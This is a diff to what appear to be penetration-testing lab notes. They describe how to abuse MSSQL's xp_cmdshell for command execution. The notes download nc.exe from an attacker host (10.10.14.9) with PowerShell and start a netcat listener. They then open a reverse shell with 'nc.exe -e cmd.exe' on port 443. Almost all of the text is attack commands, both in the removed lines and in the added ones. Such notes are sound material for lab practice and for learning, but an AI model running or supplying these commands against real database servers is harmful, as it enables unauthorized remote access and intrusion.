@@ -20,11 +20,15 @@ what also works:
 ```bash
 xp_cmdshell 'whoami'
 ```
-upload reverseshell script:
+upload reverse shell script to directory where user has access:
 ```bash
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc.exe -outfile nc.exe"
 ```
-run reverseshell script:
+on local machine run:
 ```bash
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"
+nc -nlvp 443"
+```
+run reverse shell script:
+```bash
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.9 443"
 ```
